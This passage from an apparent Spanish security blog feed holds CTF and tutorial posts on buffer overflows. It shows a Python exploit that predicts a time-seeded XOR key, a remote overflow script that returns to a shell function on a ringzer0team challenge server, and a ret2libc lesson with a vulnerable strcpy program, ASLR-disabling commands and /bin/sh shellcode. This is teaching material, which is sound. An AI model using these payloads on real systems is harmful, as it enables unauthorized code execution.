rand() genera números psudo-aleatorios que dependen directamente de la semilla, por lo que si 2 programas poseen la misma semilla, rand() generará el mismo número "aleatorio" en ambos programas.<br /><br />Las funciones srand(), rand() y time() son propias de <b>libc</b>, y debido a esto solo deberían ser accesibles desde otro programa escrito en <b>C</b>.<br /><br />Pero afortunadamente python posee la librería <a href="https://docs.python.org/2/library/ctypes.html" style="font-weight: bold;">ctypes</a>, el cual provee estructuras de datos compatibles entre ambos lenguajes y permite utilizar funciones de librerías del sistema dentro de python.<br /><br />Por medio de ctypes realizaremos la generación de la misma semilla y el mismo key random que el binario, cifraremos nuestro payload y ejecutaremos el binario.<br /><br />De esta forma el exploit sera valido el 99% de las veces que el reloj del sistema repita la misma hora tanto en el exploit como en el binario.<br /><br />Nuestro exploit solo fallara cuando la diferencia del reloj entre la ejecución del exploit y la del binario varíe en pocos milisegundos.<br /><br />Supongamos que nuestro exploit se ejecuta a las 00:00:00:59 ms, al realizar el proceso de obtener la semilla, obtendremos un numero random correspondiente a 00:00:00 pero al llegar a la ejecución del binario el reloj del sistema estará en 00:00:01, por lo que el KEY del binario sera distinto al que nosotros obtuvimos.<br /><br />Todas las veces que esto <b>no suceda</b> nuestro exploit funcionara &nbsp;correctamente.<br /><br />Código:<br /><br /><pre class="brush: py">import os<br />import struct<br />from ctypes import *<br /><br />libc = CDLL("libc.so.6");<br /><br />def xor_enc(inside):<br /> payload = "";<br /> libc.srand(libc.time())<br /> key = (libc.rand() % 256) # %256 limita el valor de rand() entre 0 y 255 valor que puede tomar unsigned char<br /> for letter in inside:<br />  payload = payload + str(chr(ord(letter) ^ int(key)));<br /> return payload;<br /><br />address = 0xbffffeda; #Address of SHELLCODE enviroment variable  <br />sleed1 = 'TEST'+'\x90'*8<br />sleed2 = '\x90'*240<br /><br />try:<br /> hex_add = struct.pack('&lt;I',address)<br /><br /> payload = sleed1+hex_add+sleed2<br /> arg = xor_enc(payload)<br /><br /> print str(hex(ord(hex_add[3]))) + str(hex(ord(hex_add[2]))).replace('0x','') + str(hex(ord(hex_add[1]))).replace('0x','') + str(hex(ord(hex_add[0]))).replace('0x','');<br /><br /> os.system('/levels/level4 '+arg) #Change executable file to /levels/level4<br />except:<br /> print "Exploit Fail"<br /><br /></pre><br />Como resultado, obtenemos en la primera ejecución nuestra preciada shell:<br /></div><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-v3tQXDsrkOY/VpGEp5sVWyI/AAAAAAAAA4k/BsxuJXmwUnk/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-09%2B19%253A04%253A46.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="94" src="http://1.bp.blogspot.com/-v3tQXDsrkOY/VpGEp5sVWyI/AAAAAAAAA4k/BsxuJXmwUnk/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-09%2B19%253A04%253A46.png" width="640" /></a></div><br />Happy Hunting!</div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecuritySocket Remote Exploit Library]]></title>
    <link href="http://securitysignal.github.io/blog/2015/12/30/securitysocket-remote-exploit-library/"/>
    <updated>2015-12-30T21:36:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/12/30/securitysocket-remote-exploit-library</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-OxY-oPd-kYc/VoSeAYE8OrI/AAAAAAAAAxM/FzaCDQwCETU/s1600/fibraoptica.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="300" src="http://2.bp.blogspot.com/-OxY-oPd-kYc/VoSeAYE8OrI/AAAAAAAAAxM/FzaCDQwCETU/s400/fibraoptica.jpg" width="400" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><b><br /></b></div><div style="text-align: left;">Hoy tengo el agrado de presentar SecuritySocket, una pequeña libreria que tiene como finalidad volver mas amigable el desarrollo de exploits.<br /><a name='more'></a><br /><br />La misma integra shellcodes para arquitecturas x86, x64 y ARM. Ademas permite la lectura y escritura de sockets y el manejo de sockets interactivos post explotación de forma sencilla y practica.<br /><br />Incluye reverse shells shellcodes para arquitecturas x86/x86-64 que se adaptan dependiendo de nuestro ip/port a atacar <br /><br />El código en cuestión se encuentra en:<br /><br /><a href="https://bitbucket.org/hdbreaker/securitysocket">https://bitbucket.org/hdbreaker/securitysocket</a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Demás esta decir que esta libre la invitación a todos los entusiastas que quieran aportar su granito de arena al desarrollo.<br /><br />A forma de introducción al funcionamiento de la librería voy a mostrar como desarrollar un exploit para solucionar el reto <a href="http://ringzer0team.com/challenges/181">Remote Auth</a> de <a href="http://ringzer0team.com/">ringzer0team</a></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-GGZO-a4k_WQ/VoSmrnHmLEI/AAAAAAAAAxc/nkqwpD4cRGE/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B00%253A49%253A46.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="233" src="http://4.bp.blogspot.com/-GGZO-a4k_WQ/VoSmrnHmLEI/AAAAAAAAAxc/nkqwpD4cRGE/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B00%253A49%253A46.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">&nbsp;El reto nos brinda un binario de prueba para que analicemos su funcionamiento, y lleguemos a la idea de como explotar la vulnerabilidad.<br /><br />Para realizar en análisis voy a utilizar IDA PRO junto a GDB, todos sabemos que IDA PRO tiene una versión comercial, una free y que también anda dando vueltas una versión pirateada. De cualquier forma el análisis también se podría realizar con EDB como sustituto open source de IDA.&nbsp;</div><div style="text-align: left;">(Solo voy a decir que si tienen la posibilidad de comprar un software lo hagan ya que de esa forma apoyan al desarrollo de un proyecto y evitan la descontinuidad del mismo por falta de presupuesto) &nbsp;</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Descargamos el binario y analizamos su arquitectura:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-PX8tpH7Jy9c/VoSoqh95i5I/AAAAAAAAAxo/jamI2NClhtY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A01%253A17.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="14" src="http://2.bp.blogspot.com/-PX8tpH7Jy9c/VoSoqh95i5I/AAAAAAAAAxo/jamI2NClhtY/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A01%253A17.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Se trata de un ejecutable de arquitectura x64, por lo que requeriremos de un procesador x64 para poder ejecutarlo.<br /><br />Ya definido el scope pasamos a analizarlo con IDA:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-nybWxG6pjC8/VoSpQSZI_0I/AAAAAAAAAxw/MF1LkKRcgTI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A03%253A56.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="284" src="http://3.bp.blogspot.com/-nybWxG6pjC8/VoSpQSZI_0I/AAAAAAAAAxw/MF1LkKRcgTI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A03%253A56.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br /><div style="text-align: left;">la función main es la que se encarga de inicializar un socket server y ponerlo a la escucha de nuevas conexiónes, lo importate aquí es la funcion validate_password:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-nAjguYZgcY0/VoSpw2PGqhI/AAAAAAAAAx4/OcinVaY0qz0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-30%2B05%253A02%253A08.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-nAjguYZgcY0/VoSpw2PGqhI/AAAAAAAAAx4/OcinVaY0qz0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-30%2B05%253A02%253A08.png" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">A simple vista podemos apreciar una serie de funciones muy importantes: <b>_memset, _strcpy y _strcmp.</b></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-dNwEiiRLoCQ/VoSqZjTHPlI/AAAAAAAAAyI/HRIdjSKHdII/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-30%2B05%253A02%253A40.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="395" src="http://3.bp.blogspot.com/-dNwEiiRLoCQ/VoSqZjTHPlI/AAAAAAAAAyI/HRIdjSKHdII/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-30%2B05%253A02%253A40.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">En el diagrama de flujo de Graph view de IDA, podemos apreciar los 2 posibles caminos que puede tomar <b>jnz </b>dependiendo del resultado de&nbsp;_strcmp, suponiendo que el resultado es <b>TRUE </b>se continuara por el camino izquierdo, el cual realiza un llamado a la funcion <b>rao_prompt</b>, tambien podemos apreciar el string <b>ALPINE </b>probable password hardcodeado.</div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-brdPlhYfWKk/VoSrk2ykpzI/AAAAAAAAAyU/1lMFY_txAe8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A13%253A59.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-brdPlhYfWKk/VoSrk2ykpzI/AAAAAAAAAyU/1lMFY_txAe8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A13%253A59.png" /></a></div><div style="text-align: left;"><b>rao_prompt</b>&nbsp;por su parte realiza un llamado a _execve enviando como argumento "/bin/sh", por lo que queda claro que esta función es la que realiza el spawn de la shell.<br /><br />Si ponemos a la escucha el binario de prueba: <b>./bin 4444</b> y nos conectamos a nuestro localhost podemos apreciar la primer impresión del funcionamiento completo del sistema:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-g5fB0PTazis/VoSsmN67u4I/AAAAAAAAAyc/g4XwptvzhPI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A18%253A12.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="110" src="http://1.bp.blogspot.com/-g5fB0PTazis/VoSsmN67u4I/AAAAAAAAAyc/g4XwptvzhPI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A18%253A12.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Como podemos apreciar la contraseña hardcodeada <b>ALPINE</b> nos brinda acceso a la shell (Cualquier coincidencia entre CRISCO y &nbsp;<a href="http://www.theregister.co.uk/2015/12/21/security_code_to_backdoor_juniper_firewalls_revealed_in_firmware/">JUNIPER</a>&nbsp;es mera casualidad)</div><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: left;">En este punto podemos ver que el reto consiste en conectarse a un servidor e ingresar una clave, si la clave es correcta el binario nos sirve una shell, obviamente no tenemos la clave, es algo ilogico pensar que en un reto de Exploiting nos vamos a encontrar con la contraseña funcional harcodeada esperando a ser reverseada, de todas formas para matar la curiosidad lo probamos sin exito:<br /><br /></div><div style="text-align: center;"><a href="http://2.bp.blogspot.com/-VgjGVSQGyOk/VoSuC08XM9I/AAAAAAAAAyo/cY9NGFq15yk/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A24%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="128" src="http://2.bp.blogspot.com/-VgjGVSQGyOk/VoSuC08XM9I/AAAAAAAAAyo/cY9NGFq15yk/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A24%253A28.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Hemos llegado al momento donde debemos identificar la vulnerabilidad y explotarla, sabiendo que la ultima función a la que podemos llegar sin una contraseña es <b>validate_password </b>y que la misma posee un <b>strcpy</b>, es probable que en ella radique la vulnerabilidad.<br /><br />Para analizar de mejor forma la función &nbsp;<b>validate_password </b>utilizaremos los dotes de Hexrays decompiler, para obtener un pseudocodigo en C simil al original. (digo pseudocodigo simil ya que hexrays genera codigo C interpretando el ASM y no es 100% exacto al programado originalmente)&nbsp;</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/--_gv8bHHgws/VoSw90gQgwI/AAAAAAAAAy0/oylsjOY5Gv8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A36%253A52.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="366" src="http://3.bp.blogspot.com/--_gv8bHHgws/VoSw90gQgwI/AAAAAAAAAy0/oylsjOY5Gv8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A36%253A52.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Analizando rapidamente el código apreciamos que se crea un buffer <b><span style="color: red;">s</span>&nbsp;de 0x30 bytes (48 Decimal), </b>luego <b>strcpy </b>copia <b>sin previa validación</b>, el contenido de <b>a1</b> (argumento de la función) dentro de <b><span style="color: red;">s</span></b>&nbsp;</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Posteriormente <b>strcmp </b>compara si&nbsp;<b style="color: red;">s </b><span style="color: red;">es igual al string </span><b style="color: red;">"ALPINE" </b>y en caso de serlo lanza la función <b>rao_prompt() </b>que como ya habiamos dicho ejecuta <b>execve('/bin/bash', NULL, NULL) </b>devolviendonos shell.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b style="color: red;">Quiero remarcar que el uso de ! dentro del if es porque strcmp retorna 0 si la comparación es TRUE, por lo que if(0) devolvería false en vez de true, así que se convierte el 0 a 1 por medio del uso de ! de esta forma si strcmp es true osea 0 =&gt; if(!0) =&gt; if(1) =&gt; if(true) :)</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Entendiendo esto sabremos apreciar que el fallo esta en como <b>strcpy </b>puede <b>overflodear </b>el buffer <b><span style="color: red;">s</span>.</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Tambien sabemos que <b>memset </b>crea un buffer de 48 bytes por lo que con 49 bytes podemos comenzar a overflodearlo y aumentando gradualmente podemos llegar a, en el mejor de los casos, sobrescribir <b>RIP.</b>Para asegurarnos de esto corroboramos que no exista otro tipo de protección:</div><div style="text-align: center;"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-FGGLbWDOugk/VoS1ednx0gI/AAAAAAAAAzA/JXu3jQkowE0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A55%253A33.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="58" src="http://3.bp.blogspot.com/-FGGLbWDOugk/VoS1ednx0gI/AAAAAAAAAzA/JXu3jQkowE0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B01%253A55%253A33.png" width="640" /></a></div></div><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: left;"><span style="color: red;">Observamos que no existe STACK CANARY pero si esta activo el BIT NX, por lo que utilizar <b>ret2libc </b>seria una opción, pero en nuestro caso tenemos a favor la funcion&nbsp;</span><b>rao_prompt() </b>que basicamente realiza el <b>ret2libc</b> por nosotros.<br /><br />Comprendiendo esto y suponiendo que en el servidor esta desactivada la protección <b>ASLR</b>, nuestra exploit debería overflodear el buffer en <b>strcpy </b>hasta llegar a controlar el flujo de <b>RIP </b>y hacer saltar la ejecución hacia&nbsp;<b>rao_prompt.<br /><br />Para lograr esto debemos obtener 2 datos:<br /><br />La dirección de rao_promt, y el largo correcto de bytes que nos coloque al pie de RIP.</b><br /><b><br /></b><br /><div style="text-align: center;"><b><a href="http://1.bp.blogspot.com/-ShpY91UTFzE/VoS3IzUJusI/AAAAAAAAAzM/CmUNbpWGAvA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A02%253A46.png" imageanchor="1" style="font-weight: normal; margin-left: 1em; margin-right: 1em;"><img border="0" height="446" src="http://1.bp.blogspot.com/-ShpY91UTFzE/VoS3IzUJusI/AAAAAAAAAzM/CmUNbpWGAvA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A02%253A46.png" width="640" /></a></b></div><b></b></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>rao_prompt </b>comienza en el <b>push </b>y se encuentra en la dirección: <b>0x40149B</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Solo basta realizar algunas pruebas aumentando los bytes 1 a 1 hasta pisar el RIP con <b>60 bytes</b></div><div style="text-align: left;"><b><br /></b></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-drTFsaGJvqk/VoS47sEV09I/AAAAAAAAAzY/fUidLLnGTkM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A10%253A26.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="153" src="http://2.bp.blogspot.com/-drTFsaGJvqk/VoS47sEV09I/AAAAAAAAAzY/fUidLLnGTkM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A10%253A26.png" width="640" /></a></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Por lo tanto con <b>56 bytes quedamos en el pie de RIP!</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Nuestro payload quedaría mas o menos asi:<br /><br /><b>payload = "\x90" * 58 + struct.pack('&lt;I',&nbsp;0x40149B);</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Realizando una prueba rápida para validar el fucionamiento, vemos que todo funciona correctamente:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-kNDY47-jrOY/VoS6BKxDfhI/AAAAAAAAAzg/G8I2TIfMYwU/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A15%253A03.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="50" src="http://2.bp.blogspot.com/-kNDY47-jrOY/VoS6BKxDfhI/AAAAAAAAAzg/G8I2TIfMYwU/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A15%253A03.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Pero inmediatamente luego de que el servidor nos brinda shell este cierra la conexión sin dejarnos interactuar con el prompt.</div><div style="text-align: left;">En este punto ya tenemos todos los ingredientes para comenzar a codificar nuestro exploit y utilizar la librería SecuritySocket para obtener una shell interactiva:</div><div style="text-align: left;"><br /></div><div style="text-align: left;">El código habla por si solo por lo que no entrare en detalles:<br /><br /><pre class="brush: py">from securitysignal import * #importamos la librería<br />import struct<br /><br />s = SecuritySocket('ringzer0team.com', 1001); #Creamos la conexión por sockets<br />rao_promptAdress = 0x40149B; #dirección de memoria de rao_promt<br />payload = '\x90'*56+struct.pack('&lt;I', rao_promptAdress);&nbsp;<br /><br />s.send(payload) &nbsp;#Enviamos el payload<br />s.interactive(); #Capturamos la respuesta e iniciamos la shell interactiva<br /></pre></div><br /><br />El resultado:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/--UcSSPYh69o/VoS8afFhDZI/AAAAAAAAAzs/_-wArQDtM_E/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A25%253A32.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="94" src="http://4.bp.blogspot.com/--UcSSPYh69o/VoS8afFhDZI/AAAAAAAAAzs/_-wArQDtM_E/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-12-31%2B02%253A25%253A32.png" width="640" /></a></div><br />Solo resta leer el flag y pasar el reto.<br /><br />Espero que esta librería sea de utilidad a todos los interesados en el desarrollo de exploits y que la resolución del reto les haya sido de interés.<br /><br /><div style="text-align: right;">Saludos!</div><br />]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Desbordando El Buffer en Linux X86 (IV)]]></title>
    <link href="http://securitysignal.github.io/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/"/>
    <updated>2015-12-18T13:53:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-PXX_Zzy6xbM/VlZ88EuyFeI/AAAAAAAAAtA/u7AZAVesZ1o/s1600/Captura%2Bde%2BTela%2B2013-09-10%2Ba%25CC%2580s%2B01.30.53.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="443" src="http://3.bp.blogspot.com/-PXX_Zzy6xbM/VlZ88EuyFeI/AAAAAAAAAtA/u7AZAVesZ1o/s640/Captura%2Bde%2BTela%2B2013-09-10%2Ba%25CC%2580s%2B01.30.53.png" width="640" /></a></div><br /><div style="text-align: right;"><b>by hdbreaker</b></div><br />En el <a href="http://www.securitysignal.org/2015/01/desbordando-el-buffer-en-linux-x86-iii_14.html">anterior</a> tutorial se logro ejecutar código arbitrario saltando la protección ASLR por medio de llamadas a funciones definidas, pero en nuestro ejemplo<br /><a name='more'></a> nos veíamos obligados a desactivar el flag NX (Non-Exec).<br /><br />Non-Exec es una protección de memoria que indica cuales sectores de la misma son aptos para la ejecución de código y cuales secciones son solo para almacenamiento de datos.<br /><br />En esta cuarta parte de nuestros talleres para aprender a explotar el buffer en sistemas Linux x86 trataremos de forma práctica cómo bypassear la protección NX (Non-Exec) por medio de <b>ret2libc</b>.<br /><br />Esta entrega es algo larga y esto puede volverla un poco tediosa, se recomienda tener conocimientos previos en el tema, o como mínimo haber leído y resuelto las entregas anteriores. He intentado explicar la técnica de la forma más clara posible, les recomiendo releer todas la veces que sea necesario.<br /><br />Para comprender el funcionamiento de memoria junto a la protección NX, nos basaremos en la siguiente imagen:<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-lNANbPMrFbw/VlaBki2Sw7I/AAAAAAAAAtM/em60GdG_S-Y/s1600/image.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="350" src="http://2.bp.blogspot.com/-lNANbPMrFbw/VlaBki2Sw7I/AAAAAAAAAtM/em60GdG_S-Y/s400/image.png" width="400" /></a></div><div style="text-align: center;"><br /></div><div><br /></div>Supongamos que logramos overflodear nuestro Espacio de Variables, logrando escribir sobre ESP y posteriormente controlar el flujo logrando modificar EIP.<br /><br />Todo indicaría que podríamos apuntar EIP hacia nuestro Shellcode dentro de ESP y de esta forma lograr ejecutar código arbitrariamente.<br /><br />Como vimos en entradas anteriores, esto funcionaría si la sección de ESP no estuviera protegida por el flag Non-Exec (NX).<br /><div><br /></div><div>En este ejemplo nuestro código va a ser compilado con la protección NX, por lo que aun que logremos escribir bytes dentro de ESP al momento de dirigir EIP hacia&nbsp;la sección de ESP donde se encuentre nuestro Shellcode, la misma al estar marcada como No Ejecutable va a pasar por alto la ejecución de los bytes.  <br /><br />Código:<br /><br /><pre class="brush: cpp">#include &lt;stdlib.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;string.h&gt;<br /><br />int main(int argc, char *argv[]) {<br /><br />    char buffer[100];<br /><br />    strcpy(buffer, argv[1]);<br /><br />    printf("%s\n",buffer);<br /><br />    return 0;<br />}<br /></pre><div><br /></div><br />Para centrarnos sólo en superar la protección NX desactivaremos ASLR:<br /><br /><pre class="brush: bash">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br /></pre><br />Y luego compilaremos de la siguiente forma:  <br /><br /><pre class="brush: bash">gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -ggdb pwn.c -o pwn<br /></pre><br />luego asignamos permisos de root al binario y ponemos activo el bit SUID<br /><br /><b>chown root pwn</b><br /><b>chgrp root pwn</b><br /><b>chmod +s pwn</b><br /><br />El flag -m32 indica que se debe compilar para la arquitectura x86 (ya que mi pc es x64 debo incluir este flag)<br /><br />Si analizamos la forma de compilar vemos que se ha eliminado el flag <b>-z execstack</b>&nbsp;este flag es el encargado de eliminar la protección NX, al no colocarlo como parámetro de gcc el binario se compilará utilizando esta protección.<br /><br />En este momento dividiremos la entrada en 2 partes, realizaremos una explotación tradicional del binario con el fin de demostrar el funcionamiento de NX y posteriormente saltaremos esta protección por medio de <b>ret2libc.</b><br /><b><br /></b><b>Explotación Tradicional:</b><br /><br />Iniciamos gdb e intentamos desbordar el buffer utilizando pyhton:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-bKbmIN_DElE/VlaOby44YAI/AAAAAAAAAts/r62BMlIPIsQ/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A45%253A06.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-bKbmIN_DElE/VlaOby44YAI/AAAAAAAAAts/r62BMlIPIsQ/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A45%253A06.png" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Observamos que a partir del caracter número 105 comenzamos a sobrescribir EIP:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-tNKlVeYeyf4/VlaOBTwlemI/AAAAAAAAAtk/rC8281HRgbM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A43%253A31.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="54" src="http://4.bp.blogspot.com/-tNKlVeYeyf4/VlaOBTwlemI/AAAAAAAAAtk/rC8281HRgbM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B01%253A43%253A31.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este punto sabemos que poseemos un espacio de 104 bytes para agregar nuestro Shellcode, para asegurarnos el correcto flujo de ejecución agregaremos algunos NOPS (\x90) antes de nuestro shellcode con el fin de completar el espacio necesario para que nuestro byte 105 sobre escriba EIP (Esto se denomina NOPSLEED).<br /><br />Para nuestro ejemplo utilizaremos el siguiente Shellcode de 24 Bytes y preparado para brindarnos una shell en arquitectura x86:</div><div style="text-align: left;"><br /><pre class="brush: cpp">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80<br /></pre></div><div style="text-align: left;"><br />Sabiendo que debemos completar 104 bytes para quedar en el pie de EIP, y que nuestra shellcode es de 24 bytes, nuestro <b>nopsleed</b> debe calcularse como: <b>104 - 24 = 80 bytes</b><br /><br />Dando como resultado:<br /><br /><b>python -c "print '\x90'*80+'Shellcode'+'EIPOverflow'"</b><br /><b><br /></b>Ahora nos falta obtener la dirección de memoria de nuestro payload, para esto utilizamos gdb para correr el binario enviando como parámetro nuestro payload:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-tosGyMScQEA/VlaTA9A9HPI/AAAAAAAAAt4/vvgP9XEuu8U/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A04%253A48.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="58" src="http://4.bp.blogspot.com/-tosGyMScQEA/VlaTA9A9HPI/AAAAAAAAAt4/vvgP9XEuu8U/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A04%253A48.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Como podemos observar hemos sobre escrito EIP de forma correcta, ahora inspeccionaremos ESP hasta encontrar alguna sección de nuestro NOPSLEED:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-t4zribF1Mc4/VlaTzT6PwuI/AAAAAAAAAuI/eacm0eyQUPA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A08%253A09.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="136" src="http://2.bp.blogspot.com/-t4zribF1Mc4/VlaTzT6PwuI/AAAAAAAAAuI/eacm0eyQUPA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A08%253A09.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-JJr2DLJ7NvY/VlaT-lq93wI/AAAAAAAAAuQ/MpPpKhg_QoY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A09%253A06.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="120" src="http://1.bp.blogspot.com/-JJr2DLJ7NvY/VlaT-lq93wI/AAAAAAAAAuQ/MpPpKhg_QoY/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-11-26%2B02%253A09%253A06.png" width="640" /></a></div><div 